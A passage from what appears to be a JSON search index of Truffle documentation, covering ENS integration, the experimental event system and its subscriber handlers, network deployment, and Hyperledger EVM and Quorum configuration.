on the deployer object available during migration functions. Currently there is a single method on this module named setAddress . If you own a domain name, you can use this method to deploy a resolver and set its address. If the resolver already exists, it will set the address that the resolver references if it is not the same as the input address. The signature for this method is setAddress(name: string, addressOrContract: string | TruffleContractInstance>, txParams: object) . A quick explanation of these parameters follows: The name parameter describes the name for which to set the resolver address. This name will look something like \"myName.eth\". The addressOrContract parameter must either be a string or a Truffle contract object that has an address property. If it is a string it must be an Ethereum address. If a Truffle contract has been deployed on the network you are using, then you can use that object as an argument. It will use that contract's address to set the resolver target. The txParams parameter is an object that must contain a from property that specifies the address to send the transaction from. This must be the address that owns the domain in question. If this address does not own the domain then the transaction will fail. Automatic registry deployment \u00b6 Another feature of this integration is the ability to deploy an ENS registry on a network. This would be useful when developing locally and testing. If Truffle cannot connect to an ENS registry on the network you are using, it will check to see if you have \"dev mode\" enabled. If you do, it will attempt to deploy a new registry on the network you are running a migration on. It will also set ownership for the names used in calls to setAddress such that those calls will be successful.","title":"Ethereum Name Service"},{"location":"docs/truffle/advanced/ethereum-name-service.html#ethereum-name-service","text":"Truffle has a built-in Ethereum Name Service (ENS) integration. ENS is a mechanism that allows for the mapping of human readable names to Ethereum addresses or other resources. With ENS enabled, Truffle allows you to use ENS names when interacting with your contracts and it will resolve them for you. Wherever you can use an address in your transaction parameters, you can use an ENS name as long as you are able to connect successfully to an ENS registry. For more information on the Ethereum Name Service, see the ENS website .","title":"Ethereum Name Service"},{"location":"docs/truffle/advanced/ethereum-name-service.html#configuration","text":"In order to use ENS features in your project, you must first enable it in your Truffle config ( truffle-config.js ). In the config, you must specify an ens property and set ens.enabled to true . The simplest configuration you would have is the following in your Truffle config: module . exports = { ens : { enabled : true } } By default, Truffle connects to the official, ENS-deployed registries. These four registries can be found on: Mainnet Ropsten Rinkeby Goerli If a valid provider is supplied for one of these four networks, Truffle will connect and use the official registry for that particular network; that is, unless a different registry address is specified in the config. If you need to specify a different registry, you can enter it in your config for the <networkName>.ens.registry.address property. If your network name were myNetwork then this might look like: module . exports = { networks : { myNetwork : { host : \"localhost\" , port : 8000 , network_id : \"*\" , ens : { registry : { address : \"0x1234567890123456789012345678901234567890\" } } } }, ens : { enabled : true } } If you are not connected to one of the above four networks and do not supply a registry address. Truffle will attempt to deploy a registry for you to use. See the section below on automatic registry deployment for more information. It must be noted that the registry address you supply needs to agree with whatever provider is present otherwise ENS resolution will not work. In other words, if you supply a provider for Kovan, you must also supply a registry address for an ENS registry on the Kovan network (since Kovan does not have an official ENS registry deployment). As was stated above, however, you do not need to supply a registry address for the above networks unless you want to use a custom ENS registry.","title":"Configuration"},{"location":"docs/truffle/advanced/ethereum-name-service.html#ens-module-methods-and-properties","text":"deployer.ens.registryAddress This property returns the address of the registry that Truffle is connected to. deployer.ens.setAddress() As part of this ENS integration, a new ens module is available on the deployer object available during migration functions. Currently there is a single method on this module named setAddress . If you own a domain name, you can use this method to deploy a resolver and set its address. If the resolver already exists, it will set the address that the resolver references if it is not the same as the input address. The signature for this method is setAddress(name: string, addressOrContract: string | TruffleContractInstance>, txParams: object) . A quick explanation of these parameters follows: The name parameter describes the name for which to set the resolver address. This name will look something like \"myName.eth\". The addressOrContract parameter must either be a string or a Truffle contract object that has an address property. If it is a string it must be an Ethereum address. If a Truffle contract has been deployed on the network you are using, then you can use that object as an argument. It will use that contract's address to set the resolver target. The txParams parameter is an object that must contain a from property that specifies the address to send the transaction from. This must be the address that owns the domain in question. If this address does not own the domain then the transaction will fail.","title":"ens module methods and properties"},{"location":"docs/truffle/advanced/ethereum-name-service.html#automatic-registry-deployment","text":"Another feature of this integration is the ability to deploy an ENS registry on a network. This would be useful when developing locally and testing. If Truffle cannot connect to an ENS registry on the network you are using, it will check to see if you have \"dev mode\" enabled. If you do, it will attempt to deploy a new registry on the network you are running a migration on. It will also set ownership for the names used in calls to setAddress such that those calls will be successful.","title":"Automatic registry deployment"},{"location":"docs/truffle/advanced/event-system.html","text":"Truffle Event System \u00b6 Note : The Truffle Event System is currently an experimental feature and we anticipate that it will be developing and changing in the near future. Please keep this in mind when using this feature as we cannot promise that its architecture or the API will remain the same until we declare it as stable. Please enjoy and if you discover any issues or bugs, we would love it if you created an issue on the Truffle GitHub page . Thank you! The Truffle Event System is a system of hooks implemented in several of the command flows. Truffle commands emit events for specific tasks, passing data relevant to the task. For example, during compilation an event is emitted that contains the names of contracts that are being compiled. Events are currently implemented for the following Truffle command flows: - compile - unbox - obtain We plan to integrate the event system into the rest of Truffle's command flows in future versions of Truffle. How it works \u00b6 All emitted events are named after the task that emits them. What makes Truffle's event system different than an event emitter is that the names of events are \"namespaced\", each part of the name being separated by a colon. The entire name, in whole, is called the \"event name\". A simple example of an event name in the compile command flow is \"compile:start\" . Individual components of event names are \"labels\". The event name \"compile:start\" has two labels: \"compile\" and \"start\" . This particular event is emitted near the very start of the code that runs during compilation. A slightly more complicated name from the unbox command flow is \"unbox:downloadingBox:succeed\" . This event name has three labels: \"unbox\" , \"downloadingBox\" , and \"succeed\" . This event, as you can probably guess, is emitted when a Truffle box has successfully finished downloading during the unbox command flow. Events are often grouped into sub-labels that mark the beginning and end of a process. Paired event names are common, e.g., an event name ends with \":start\" and another that ends with \":succeed\" . These denote the start and successful finish of a certain event. Another common label, \"fail\" , is used to indicate the failure of a certain event. When the event \"compile:start\" is emitted, it means that compilation has started. \"compile:succeed\" lets us know that compilation has completed and \"compile:fail\" tells us that compilation has failed. In order to make use of this system, you are able to provide handlers for any emitted event. These handlers will be executed when matching events are emitted. In the Subscribers section you will find a description of how to attach handlers to events. As was mentioned briefly, some events also provide data to the handlers when emitted. This could be useful for collecting statistics or perhaps to make your own formatted output during development. \"compile:compiledSources\" is an example of an event that provides data about what source files were used during compilation. This data comes in the form of an array of source filenames that you can log to the console, save to a file, or use however you please. In the Currently supported events section you will find a chart of all currently available event names, where they are emitted in the command flow, and what data is available in the handlers for that event. Subscribers \u00b6 In order to react to events you must create a JavaScript file that will be used to create a \"Subscriber\". A Subscriber is a class that manages a group of event handlers. This file is used internally by a Subscriber to indicate what to do when events are emitted. The Subscriber checks two exported fields: initialization and handlers . initialization must be a function. This function is executed when the Subscriber is instantiated at the beginning of all command flows. This function is optional. NOTE: In this function you will have access to the Subscriber itself through the this keyword when your functions are described using function syntax, i.e., function(data){ , not (data) => { . This makes it easy to attach properties and helper methods to the Subscriber that will then be available in your handlers. handlers should be an object whose keys are event names and values are an array of event handler functions. This is where you will describe what functions to run when certain events are fired. The following section describes how to construct event handlers. In order to use this file as a Subscriber you must require() it in your truffle-config.js under the \"subscribers\" object: modules . exports = { networks : { // ... }, subscribers : { mySubscriberName : require ( \"../my-subscriber-config.js\" ), myOtherSubscriberName : require ( \"../my-other-subscriber-config.js\" ) } } How to define your event handlers \u00b6 This section will describe how to create your event handlers. When you are ready to see a couple of examples, see the default subscribers for Truffle. To create your event handlers you will need to populate the handlers object. In order to describe which handlers correspond to which events, you must create at least one \"event matcher\". An event matcher is a string that will be used to match against events that are emitted. An event matcher could be the exact event name, like \"compile:start\" , or you may use wildcard characters ( \"*\" and \"**\" ) to match multiple events. A single asterisk ( \"*\" ) is used to match a single label within an event name. The event matcher \"unbox:*\" would match any event name that has exactly two labels and starts with \"unbox\" . \"unbox:*\" would match \"unbox:start\" and \"unbox:succeed\" but not \"unbox:downloadingBox:start\" since that has three labels. Nor would it match \"compile:start\" since the first word does not match \"unbox\" . A double asterisk is used to match one or more labels in an event name. So the event matcher \"unbox:\\**\" would match any event name that starts with \" unbox\" regardless of how many other labels the event name has. This means that it would match \"unbox:start\" as well as \"unbox:preparingToDownload:succeed\" . The matcher \"**:succeed\" would match \"fetchSolcList:succeed\" and \"unbox:preparingToDownload:succeed\" . In this way you are able to write handlers that match against batches of events. The event matcher string must be a key in the handlers object whose value must be an array of functions. These functions will be executed when that event matcher matches an emitted event. Every time an event matcher matches an emitted event, each of its functions will be executed. Here is a simple \"hello world\" example: module . exports = { handlers : { \"compile:start\" : [ function () { console . log ( \"hello world!\" ); } ] } }; In the above example, every time the \"compile:start\" event is emitted, \"hello world!\" will be logged to the console. NOTE: Currently you must use function syntax when creating the handler functions in order to have the appropriate this value. You can use arrow functions in your handler functions, but you will lose the this reference to the Subscriber if you do so. More on subscribers \u00b6 When you are creating your handlers, you will have access to Subscriber class methods. Most of these shouldn't be used directly except for the removeListener method. If at some point you need to remove a listener that was added, you can call this.removeListener(<eventMatcher>) to \"detach\" the handlers listed under that specific event matcher. You will also have access to everything that you made references to in the initialization function. For example: if I wanted to use an external library, perhaps one for colorful logging, I would require it in my JavaScript and create a reference to it in the initialization like so: const colors = require ( \"colors\" ); module . exports = { initialization : function () { this . colors = colors ; }, // ...... }; I would then be able to access this.colors in my handlers property! So extending the example above could yield the following code: const colors = require ( \"colors\" ); module . exports = { initialization : function () { this . colors = colors ; }, handlers : { \"compile:compiledSources\" : [ function ( data ) { const { sourceFileNames } = data ; const message = this . colors . rainbow ( `The source files are ${ sourceFileNames } ` ); console . log ( message ); } ] } }; This would log the source filenames in rainbow colors whenever the \"compile:compiledSources\" event is emitted. Remember, some events (not all) provide data to your handlers at the time of execution. The \"compile:compiledSources\" provides an array of all source filenames to this particular handler. Check the chart below to see which events are provided with what data. Reminder: The this in your Subscriber files refers to the Subscriber class that is instantiated from the file you create and not the this in the file. Currently supported events \u00b6 This section lists all events currently implemented in Truffle. They are organized by command and contain three pieces of information: the event name, when it is emitted, and the specific data, if any, that is passed along to the handlers. truffle compile \u00b6 \"compile:start\" \u00b6 Emitted at the start of the command flow. No data available for this event. \"compile:succeed\" \u00b6 Emitted at the end of the command flow. { contractBuildDirectory: <string: directory where artifacts were saved>, compilersInfo: { <compilerName>: { version: <string: version of compiler>, }, ...one entry per compiler used } } \"compile:sourcesToCompile\" \u00b6 Emitted before sources are compiled. { sourceFileNames: [ <string: filenames of sources to compile>, ...one string entry for each file ] } \"compile:warnings\" \u00b6 Emitted after sources are compiled. { warnings: [ <string: warnings created by the compiler during compilation>, ...one string entry for each warning ] } \"compile:nothingToCompile\" \u00b6 Emitted after attempted compilation if no compilation was needed No data available for this event. truffle obtain \u00b6 \"obtain:start\" \u00b6 Emitted at the start of the command flow. No data available for this event. \"obtain:succeed\" \u00b6 Emitted at the end of the command flow. { compiler: { name: <string: name of compiler obtained>, version: <string: version of compiler obtained> } } \"obtain:fail\" \u00b6 Emitted in case the obtain command fails. No data available for this event. \"downloadCompiler:start\" \u00b6 Emitted before attempting to download a compiler. { attemptNumber: <number: what number attempt at downloading the compiler> } \"downloadCompiler:succeed\" \u00b6 Emitted after successfully downloading a compiler No data available for this event. \"fetchSolcList:start\" \u00b6 Emitted before fetching the list of available versions of the Solidity compiler No data available for this event. \"fetchSolcList:succeed\" \u00b6 Emitted after fetching the list of available versions of the Solidity compiler No data available for this event. \"fetchSolcList:fail\" \u00b6 Emitted emitted if downloading the list of Solidity compiler versions fails No data available for this event. truffle unbox \u00b6 \"unbox:start\" \u00b6 Emitted at the start of command flow. No data available for this event. \"unbox:succeed\" \u00b6 Emitted at the end of command flow. { boxConfig: <object: contents of the `truffle-box.json` for the given box> } \"unbox:fail\" \u00b6 Emitted if the unbox fails. No data available for this event. \"unbox:preparingToDownload:start\" \u00b6 Emitted before setting up a temporary directory for the downloaded contents. No data available for this event. \"unbox:preparingToDownload:succeed\" \u00b6 Emitted after creating the temporary directory for the downloaded contents. No data available for this event. \"unbox:downloadingBox:start\" \u00b6 Emitted before attempting to download the box contents. No data available for this event. \"unbox:downloadingBox:succeed\" \u00b6 Emitted after downloading the box contents. No data available for this event. \"unbox:cleaningTempFiles:start\" \u00b6 Emitted before removing the temporary files. No data available for this event. \"unbox:cleaningTempFiles:succeed\" \u00b6 Emitted after removing the temporary files. No data available for this event. \"unbox:settingUpBox:start\" \u00b6 Emitted before installing box dependencies. No data available for this event. \"unbox:settingUpBox:succeed\" \u00b6 Emitted after installing box dependencies. No data available for this event.","title":"Truffle Event System"},{"location":"docs/truffle/advanced/event-system.html#truffle-event-system","text":"Note : The Truffle Event System is currently an experimental feature and we anticipate that it will be developing and changing in the near future. Please keep this in mind when using this feature as we cannot promise that its architecture or the API will remain the same until we declare it as stable. Please enjoy and if you discover any issues or bugs, we would love it if you created an issue on the Truffle GitHub page . Thank you! The Truffle Event System is a system of hooks implemented in several of the command flows. Truffle commands emit events for specific tasks, passing data relevant to the task. For example, during compilation an event is emitted that contains the names of contracts that are being compiled. Events are currently implemented for the following Truffle command flows: - compile - unbox - obtain We plan to integrate the event system into the rest of Truffle's command flows in future versions of Truffle.","title":"Truffle Event System"},{"location":"docs/truffle/advanced/event-system.html#how-it-works","text":"All emitted events are named after the task that emits them. What makes Truffle's event system different than an event emitter is that the names of events are \"namespaced\", each part of the name being separated by a colon. The entire name, in whole, is called the \"event name\". A simple example of an event name in the compile command flow is \"compile:start\" . Individual components of event names are \"labels\". The event name \"compile:start\" has two labels: \"compile\" and \"start\" . This particular event is emitted near the very start of the code that runs during compilation. A slightly more complicated name from the unbox command flow is \"unbox:downloadingBox:succeed\" . This event name has three labels: \"unbox\" , \"downloadingBox\" , and \"succeed\" . This event, as you can probably guess, is emitted when a Truffle box has successfully finished downloading during the unbox command flow. Events are often grouped into sub-labels that mark the beginning and end of a process. Paired event names are common, e.g., an event name ends with \":start\" and another that ends with \":succeed\" . These denote the start and successful finish of a certain event. Another common label, \"fail\" , is used to indicate the failure of a certain event. When the event \"compile:start\" is emitted, it means that compilation has started. \"compile:succeed\" lets us know that compilation has completed and \"compile:fail\" tells us that compilation has failed. In order to make use of this system, you are able to provide handlers for any emitted event. These handlers will be executed when matching events are emitted. In the Subscribers section you will find a description of how to attach handlers to events. As was mentioned briefly, some events also provide data to the handlers when emitted. This could be useful for collecting statistics or perhaps to make your own formatted output during development. \"compile:compiledSources\" is an example of an event that provides data about what source files were used during compilation. This data comes in the form of an array of source filenames that you can log to the console, save to a file, or use however you please. In the Currently supported events section you will find a chart of all currently available event names, where they are emitted in the command flow, and what data is available in the handlers for that event.","title":"How it works"},{"location":"docs/truffle/advanced/event-system.html#subscribers","text":"In order to react to events you must create a JavaScript file that will be used to create a \"Subscriber\". A Subscriber is a class that manages a group of event handlers. This file is used internally by a Subscriber to indicate what to do when events are emitted. The Subscriber checks two exported fields: initialization and handlers . initialization must be a function. This function is executed when the Subscriber is instantiated at the beginning of all command flows. This function is optional. NOTE: In this function you will have access to the Subscriber itself through the this keyword when your functions are described using function syntax, i.e., function(data){ , not (data) => { . This makes it easy to attach properties and helper methods to the Subscriber that will then be available in your handlers. handlers should be an object whose keys are event names and values are an array of event handler functions. This is where you will describe what functions to run when certain events are fired. The following section describes how to construct event handlers. In order to use this file as a Subscriber you must require() it in your truffle-config.js under the \"subscribers\" object: modules . exports = { networks : { // ... }, subscribers : { mySubscriberName : require ( \"../my-subscriber-config.js\" ), myOtherSubscriberName : require ( \"../my-other-subscriber-config.js\" ) } }","title":"Subscribers"},{"location":"docs/truffle/advanced/event-system.html#how-to-define-your-event-handlers","text":"This section will describe how to create your event handlers. When you are ready to see a couple of examples, see the default subscribers for Truffle. To create your event handlers you will need to populate the handlers object. In order to describe which handlers correspond to which events, you must create at least one \"event matcher\". An event matcher is a string that will be used to match against events that are emitted. An event matcher could be the exact event name, like \"compile:start\" , or you may use wildcard characters ( \"*\" and \"**\" ) to match multiple events. A single asterisk ( \"*\" ) is used to match a single label within an event name. The event matcher \"unbox:*\" would match any event name that has exactly two labels and starts with \"unbox\" . \"unbox:*\" would match \"unbox:start\" and \"unbox:succeed\" but not \"unbox:downloadingBox:start\" since that has three labels. Nor would it match \"compile:start\" since the first word does not match \"unbox\" . A double asterisk is used to match one or more labels in an event name. So the event matcher \"unbox:\\**\" would match any event name that starts with \" unbox\" regardless of how many other labels the event name has. This means that it would match \"unbox:start\" as well as \"unbox:preparingToDownload:succeed\" . The matcher \"**:succeed\" would match \"fetchSolcList:succeed\" and \"unbox:preparingToDownload:succeed\" . In this way you are able to write handlers that match against batches of events. The event matcher string must be a key in the handlers object whose value must be an array of functions. These functions will be executed when that event matcher matches an emitted event. Every time an event matcher matches an emitted event, each of its functions will be executed. Here is a simple \"hello world\" example: module . exports = { handlers : { \"compile:start\" : [ function () { console . log ( \"hello world!\" ); } ] } }; In the above example, every time the \"compile:start\" event is emitted, \"hello world!\" will be logged to the console. NOTE: Currently you must use function syntax when creating the handler functions in order to have the appropriate this value. You can use arrow functions in your handler functions, but you will lose the this reference to the Subscriber if you do so.","title":"How to define your event handlers"},{"location":"docs/truffle/advanced/event-system.html#more-on-subscribers","text":"When you are creating your handlers, you will have access to Subscriber class methods. Most of these shouldn't be used directly except for the removeListener method. If at some point you need to remove a listener that was added, you can call this.removeListener(<eventMatcher>) to \"detach\" the handlers listed under that specific event matcher. You will also have access to everything that you made references to in the initialization function. For example: if I wanted to use an external library, perhaps one for colorful logging, I would require it in my JavaScript and create a reference to it in the initialization like so: const colors = require ( \"colors\" ); module . exports = { initialization : function () { this . colors = colors ; }, // ...... }; I would then be able to access this.colors in my handlers property! So extending the example above could yield the following code: const colors = require ( \"colors\" ); module . exports = { initialization : function () { this . colors = colors ; }, handlers : { \"compile:compiledSources\" : [ function ( data ) { const { sourceFileNames } = data ; const message = this . colors . rainbow ( `The source files are ${ sourceFileNames } ` ); console . log ( message ); } ] } }; This would log the source filenames in rainbow colors whenever the \"compile:compiledSources\" event is emitted. Remember, some events (not all) provide data to your handlers at the time of execution. The \"compile:compiledSources\" provides an array of all source filenames to this particular handler. Check the chart below to see which events are provided with what data. Reminder: The this in your Subscriber files refers to the Subscriber class that is instantiated from the file you create and not the this in the file.","title":"More on subscribers"},{"location":"docs/truffle/advanced/event-system.html#currently-supported-events","text":"This section lists all events currently implemented in Truffle. They are organized by command and contain three pieces of information: the event name, when it is emitted, and the specific data, if any, that is passed along to the handlers.","title":"Currently supported events"},{"location":"docs/truffle/advanced/event-system.html#truffle-compile","text":"","title":"truffle compile"},{"location":"docs/truffle/advanced/event-system.html#compilestart","text":"Emitted at the start of the command flow. No data available for this event.","title":"\"compile:start\""},{"location":"docs/truffle/advanced/event-system.html#compilesucceed","text":"Emitted at the end of the command flow. { contractBuildDirectory: <string: directory where artifacts were saved>, compilersInfo: { <compilerName>: { version: <string: version of compiler>, }, ...one entry per compiler used } }","title":"\"compile:succeed\""},{"location":"docs/truffle/advanced/event-system.html#compilesourcestocompile","text":"Emitted before sources are compiled. { sourceFileNames: [ <string: filenames of sources to compile>, ...one string entry for each file ] }","title":"\"compile:sourcesToCompile\""},{"location":"docs/truffle/advanced/event-system.html#compilewarnings","text":"Emitted after sources are compiled. { warnings: [ <string: warnings created by the compiler during compilation>, ...one string entry for each warning ] }","title":"\"compile:warnings\""},{"location":"docs/truffle/advanced/event-system.html#compilenothingtocompile","text":"Emitted after attempted compilation if no compilation was needed No data available for this event.","title":"\"compile:nothingToCompile\""},{"location":"docs/truffle/advanced/event-system.html#truffle-obtain","text":"","title":"truffle obtain"},{"location":"docs/truffle/advanced/event-system.html#obtainstart","text":"Emitted at the start of the command flow. No data available for this event.","title":"\"obtain:start\""},{"location":"docs/truffle/advanced/event-system.html#obtainsucceed","text":"Emitted at the end of the command flow. { compiler: { name: <string: name of compiler obtained>, version: <string: version of compiler obtained> } }","title":"\"obtain:succeed\""},{"location":"docs/truffle/advanced/event-system.html#obtainfail","text":"Emitted in case the obtain command fails. No data available for this event.","title":"\"obtain:fail\""},{"location":"docs/truffle/advanced/event-system.html#downloadcompilerstart","text":"Emitted before attempting to download a compiler. { attemptNumber: <number: what number attempt at downloading the compiler> }","title":"\"downloadCompiler:start\""},{"location":"docs/truffle/advanced/event-system.html#downloadcompilersucceed","text":"Emitted after successfully downloading a compiler No data available for this event.","title":"\"downloadCompiler:succeed\""},{"location":"docs/truffle/advanced/event-system.html#fetchsolcliststart","text":"Emitted before fetching the list of available versions of the Solidity compiler No data available for this event.","title":"\"fetchSolcList:start\""},{"location":"docs/truffle/advanced/event-system.html#fetchsolclistsucceed","text":"Emitted after fetching the list of available versions of the Solidity compiler No data available for this event.","title":"\"fetchSolcList:succeed\""},{"location":"docs/truffle/advanced/event-system.html#fetchsolclistfail","text":"Emitted emitted if downloading the list of Solidity compiler versions fails No data available for this event.","title":"\"fetchSolcList:fail\""},{"location":"docs/truffle/advanced/event-system.html#truffle-unbox","text":"","title":"truffle unbox"},{"location":"docs/truffle/advanced/event-system.html#unboxstart","text":"Emitted at the start of command flow. No data available for this event.","title":"\"unbox:start\""},{"location":"docs/truffle/advanced/event-system.html#unboxsucceed","text":"Emitted at the end of command flow. { boxConfig: <object: contents of the `truffle-box.json` for the given box> }","title":"\"unbox:succeed\""},{"location":"docs/truffle/advanced/event-system.html#unboxfail","text":"Emitted if the unbox fails. No data available for this event.","title":"\"unbox:fail\""},{"location":"docs/truffle/advanced/event-system.html#unboxpreparingtodownloadstart","text":"Emitted before setting up a temporary directory for the downloaded contents. No data available for this event.","title":"\"unbox:preparingToDownload:start\""},{"location":"docs/truffle/advanced/event-system.html#unboxpreparingtodownloadsucceed","text":"Emitted after creating the temporary directory for the downloaded contents. No data available for this event.","title":"\"unbox:preparingToDownload:succeed\""},{"location":"docs/truffle/advanced/event-system.html#unboxdownloadingboxstart","text":"Emitted before attempting to download the box contents. No data available for this event.","title":"\"unbox:downloadingBox:start\""},{"location":"docs/truffle/advanced/event-system.html#unboxdownloadingboxsucceed","text":"Emitted after downloading the box contents. No data available for this event.","title":"\"unbox:downloadingBox:succeed\""},{"location":"docs/truffle/advanced/event-system.html#unboxcleaningtempfilesstart","text":"Emitted before removing the temporary files. No data available for this event.","title":"\"unbox:cleaningTempFiles:start\""},{"location":"docs/truffle/advanced/event-system.html#unboxcleaningtempfilessucceed","text":"Emitted after removing the temporary files. No data available for this event.","title":"\"unbox:cleaningTempFiles:succeed\""},{"location":"docs/truffle/advanced/event-system.html#unboxsettingupboxstart","text":"Emitted before installing box dependencies. No data available for this event.","title":"\"unbox:settingUpBox:start\""},{"location":"docs/truffle/advanced/event-system.html#unboxsettingupboxsucceed","text":"Emitted after installing box dependencies. No data available for this event.","title":"\"unbox:settingUpBox:succeed\""},{"location":"docs/truffle/advanced/networks-and-app-deployment.html","text":"Networks and App Deployment \u00b6 Even the smallest project will interact with at the very least two blockchain nodes: One on the developer's machine, like Ganache or Truffle Develop, and the other representing the network where the developer will eventually deploy their application (such as the main public Ethereum network or a private consortium network, for instance). Truffle provides a system for managing the compilation and deployment artifacts for each network, and does so in a way that simplifies final application deployment. Configuration \u00b6 See the Configuration section for more information. Specifying a network \u00b6 Most Truffle commands will behave differently based on the network specified, and will use that network's contracts and configuration. You can specify a network using the --network option, like below: $ truffle migrate --network live In this example, Truffle will run your migrations on the \"live\" network, which -- if configured like the example -- is associated with the public Ethereum blockchain. Build artifacts \u00b6 As mentioned in the Compiling contracts section, build artifacts are stored in the ./build/contracts directory as .json files. When you compile your contracts or run your migrations using a specific network, Truffle will update those .json files so they contain the information related to that network. When those artifacts are used later -- such as within your frontend or application via @truffle/contract -- they'll automatically detect which network the Ethereum client is connected to and use the correct contract artifacts accordingly. Application deployment \u00b6 Because the network is auto-detected by the contract artifacts at runtime, this means that you only need to deploy your application or frontend once . When you run your application, the running Ethereum client will determine which artifacts are used, and this will make your application very flexible. As an example, if you were to deploy a web application to http://mydapp.io, you could navigate to that address using your favorite wallet-browser (like MetaMask, or Mist) and your dapp would work correctly regardless of the Ethereum network the wallet-browser was connected to. If the wallet-browser was connected to the live network, your dapp would use the contracts you deployed on the live network. If on Ropsten, the contracts you deployed to Ropsten would be used. Source code verification \u00b6 After deploying your application, you might want to use Etherscan 's source code verification. Etherscan is one of the most popular block explorers for Ethereum, and by verifying your smart contract source code on their platform users can see what your smart contracts do before they use your application. This helps to grow trust in your smart contracts and your application. One way to do this is the Etherscan web form , but the easiest way is using truffle-plugin-verify . This plugin integrates directly with Truffle's workflow to verify your smart contracts' source code. Read more about setting up and using this plugin in the guide Automatically verify Truffle smart contracts on Etherscan .","title":"Networks and App Deployment"},{"location":"docs/truffle/advanced/networks-and-app-deployment.html#networks-and-app-deployment","text":"Even the smallest project will interact with at the very least two blockchain nodes: One on the developer's machine, like Ganache or Truffle Develop, and the other representing the network where the developer will eventually deploy their application (such as the main public Ethereum network or a private consortium network, for instance). Truffle provides a system for managing the compilation and deployment artifacts for each network, and does so in a way that simplifies final application deployment.","title":"Networks and App Deployment"},{"location":"docs/truffle/advanced/networks-and-app-deployment.html#configuration","text":"See the Configuration section for more information.","title":"Configuration"},{"location":"docs/truffle/advanced/networks-and-app-deployment.html#specifying-a-network","text":"Most Truffle commands will behave differently based on the network specified, and will use that network's contracts and configuration. You can specify a network using the --network option, like below: $ truffle migrate --network live In this example, Truffle will run your migrations on the \"live\" network, which -- if configured like the example -- is associated with the public Ethereum blockchain.","title":"Specifying a network"},{"location":"docs/truffle/advanced/networks-and-app-deployment.html#build-artifacts","text":"As mentioned in the Compiling contracts section, build artifacts are stored in the ./build/contracts directory as .json files. When you compile your contracts or run your migrations using a specific network, Truffle will update those .json files so they contain the information related to that network. When those artifacts are used later -- such as within your frontend or application via @truffle/contract -- they'll automatically detect which network the Ethereum client is connected to and use the correct contract artifacts accordingly.","title":"Build artifacts"},{"location":"docs/truffle/advanced/networks-and-app-deployment.html#application-deployment","text":"Because the network is auto-detected by the contract artifacts at runtime, this means that you only need to deploy your application or frontend once . When you run your application, the running Ethereum client will determine which artifacts are used, and this will make your application very flexible. As an example, if you were to deploy a web application to http://mydapp.io, you could navigate to that address using your favorite wallet-browser (like MetaMask, or Mist) and your dapp would work correctly regardless of the Ethereum network the wallet-browser was connected to. If the wallet-browser was connected to the live network, your dapp would use the contracts you deployed on the live network. If on Ropsten, the contracts you deployed to Ropsten would be used.","title":"Application deployment"},{"location":"docs/truffle/advanced/networks-and-app-deployment.html#source-code-verification","text":"After deploying your application, you might want to use Etherscan 's source code verification. Etherscan is one of the most popular block explorers for Ethereum, and by verifying your smart contract source code on their platform users can see what your smart contracts do before they use your application. This helps to grow trust in your smart contracts and your application. One way to do this is the Etherscan web form , but the easiest way is using truffle-plugin-verify . This plugin integrates directly with Truffle's workflow to verify your smart contracts' source code. Read more about setting up and using this plugin in the guide Automatically verify Truffle smart contracts on Etherscan .","title":"Source code verification"},{"location":"docs/truffle/distributed-ledger-support/working-with-hyperledger-evm.html","text":"Working With Hyperledger EVM \u00b6 As of version 5.0.27 , Truffle supports development with Hyperledger Fabric's EVM chaincode, a permissioned version of Ethereum. Configuration \u00b6 To use Fabric EVM, you must modify your network in truffle-config.js to include a parameter type set to \"fabric-evm\" . See the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 5000 , // default Fab3 port network_id : \"*\" , type : \"fabric-evm\" } } };","title":"Working With Hyperledger EVM"},{"location":"docs/truffle/distributed-ledger-support/working-with-hyperledger-evm.html#working-with-hyperledger-evm","text":"As of version 5.0.27 , Truffle supports development with Hyperledger Fabric's EVM chaincode, a permissioned version of Ethereum.","title":"Working With Hyperledger EVM"},{"location":"docs/truffle/distributed-ledger-support/working-with-hyperledger-evm.html#configuration","text":"To use Fabric EVM, you must modify your network in truffle-config.js to include a parameter type set to \"fabric-evm\" . See the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 5000 , // default Fab3 port network_id : \"*\" , type : \"fabric-evm\" } } };","title":"Configuration"},{"location":"docs/truffle/distributed-ledger-support/working-with-quorum.html","text":"Working With Quorum \u00b6 Truffle supports development with Quorum, a version of Ethereum that adds new features on top of what Ethereum already provides. Specifically, Quorum adds the ability to create private blockchains between select participants, and more importantly adds transaction privacy on top of normal Ethereum transactions. It is highly recommended you read our tutorial on building a dapp on Quorum before using Truffle with Quorum. Both the tutorial and this page have been updated for at least version 5.0.9 of truffle . Known Issues \u00b6 Quorum support was completely broken in version 5.0.0 , and basic support was restored in 5.0.9 . Make sure you have at least 5.0.9 . Privacy support (via privateFor ) has been restored in 5.0.14 . You must use at least 5.0.14 or v4 ( npm i -g truffle@v4 ) to use privacy features. Configuration \u00b6 To use Quorum, you must modify your network in truffle-config.js to include a parameter type set to \"quorum\" . See the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // replace with quorum node port you wish to connect to network_id : \"*\" , type : \"quorum\" } } }; Using Privacy Features \u00b6 Privacy features have been restored in Truffle 5.0.14 . They are also available in v4 . Please refer to the Quorum tutorial to learn more about how to use the privacy features within Quorum. Here are some quick references for privacy within the tutorial: - Deploying contracts privately - Making transactions private - Interacting with your contracts privately .","title":"Working With Quorum"},{"location":"docs/truffle/distributed-ledger-support/working-with-quorum.html#working-with-quorum","text":"Truffle supports development with Quorum, a version of Ethereum that adds new features on top of what Ethereum already provides. Specifically, Quorum adds the ability to create private blockchains between select participants, and more importantly adds transaction privacy on top of normal Ethereum transactions. It is highly recommended you read our tutorial on building a dapp on Quorum before using Truffle with Quorum. Both the tutorial and this page have been updated for at least version 5.0.9 of truffle .","title":"Working With Quorum"},{"location":"docs/truffle/distributed-ledger-support/working-with-quorum.html#known-issues","text":"Quorum support was completely broken in version 5.0.0 , and basic support was restored in 5.0.9 . Make sure you have at least 5.0.9 . Privacy support (via privateFor ) has been restored in 5.0.14 . You must use at least 5.0.14 or v4 ( npm i -g truffle@v4 ) to use privacy features.","title":"Known Issues"},{"location":"docs/truffle/distributed-ledger-support/working-with-quorum.html#configuration","text":"To use Quorum, you must modify your network in truffle-config.js to include a parameter type set to \"quorum\" . See the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // replace with quorum node port you wish to connect to network_id : \"*\" , type : \"quorum\" } } 